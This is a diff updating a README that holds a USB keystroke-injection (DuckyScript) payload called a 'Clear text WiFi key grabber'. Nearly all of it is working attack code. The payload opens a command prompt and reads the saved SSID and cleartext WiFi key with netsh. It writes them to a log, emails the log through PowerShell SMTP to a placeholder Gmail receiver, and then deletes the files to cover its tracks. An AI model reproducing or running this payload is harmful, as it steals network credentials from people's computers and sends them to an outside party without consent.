@@ -14,43 +14,46 @@ If you have **any suggestions** please **tell me**.
 ## **Code**:
 ```
 REM Author: Siem
-REM Version: 1
+REM Version: 2
 REM Description: Clear text WiFi key grabber
-DELAY 2000
+DELAY 1000
 WINDOWS d
+
 REM --> Open cmd
 WINDOWS r
 DELAY 500
 STRING cmd
 ENTER
 DELAY 1000
-REM --> Change directory (you can change this to something else to make less visible)
-STRING cd "%USERPROFILE%\Desktop"
+
+REM --> Getting SSID
+STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "B"') do set A=%A
 ENTER
-REM --> Get SSID
-STRING for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "B"') do set SSID=%A
+
+REM --> Creating Temp.txt
+STRING netsh wlan show profiles %A% | findstr "Network type" | findstr /v "broadcast" | findstr /v "Radio">>Temp.txt & netsh wlan show profiles %A% | findstr "Authentication">>Temp.txt & netsh wlan show profiles %A% key=clear | findstr "Key Content">>Temp.txt
 ENTER
+
 REM --> Get network type
-STRING netsh wlan show profiles %SSID% | findstr "Network type" | findstr /v "broadcast" | findstr /v "Radio">Temp.txt
+STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" Temp.txt') do set B=%A
 ENTER
-STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" Temp.txt') do set NETTYPE=%A
-ENTER
+
 REM --> Get authentication
-STRING netsh wlan show profiles %SSID% | findstr "Authentication">Temp.txt
+STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" Temp.txt') do set C=%A
 ENTER
-STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" Temp.txt') do set AUTH=%A
-ENTER
+
 REM --> Get key
-STRING netsh wlan show profiles %SSID% key=clear | findstr "Key Content">Temp.txt
+STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" Temp.txt') do set D=%A
 ENTER
-STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" Temp.txt') do set KEY=%A
-ENTER
+
 REM --> Delete Temp.txt
 STRING del Temp.txt
 ENTER
+
 REM --> Create Log.txt
-STRING echo SSID: %SSID%>>Log.txt & echo Network type: %NETTYPE%>>Log.txt & echo Authentication: %AUTH%>>Log.txt & echo Password: %KEY%>>Log.txt
+STRING echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt
 ENTER
+
 REM --> Mail Log.txt
 STRING powershell
 ENTER
@@ -70,7 +73,7 @@ STRING $ReportEmail.To.Add('RECEIVER@gmail.com')
 ENTER
 STRING $ReportEmail.Subject = 'WiFi'
 ENTER
-STRING $ReportEmail.Body = 'The log is attached!' 
+STRING $ReportEmail.Body = 'The log is attached!'
 ENTER
 STRING $ReportEmail.Attachments.Add('Log.txt')
 ENTER
@@ -78,6 +81,7 @@ STRING $SMTPInfo.Send($ReportEmail)
 ENTER
 STRING exit
 ENTER
+
 REM --> Delete Log.txt and exit
 STRING del Log.txt & exit
 ENTER
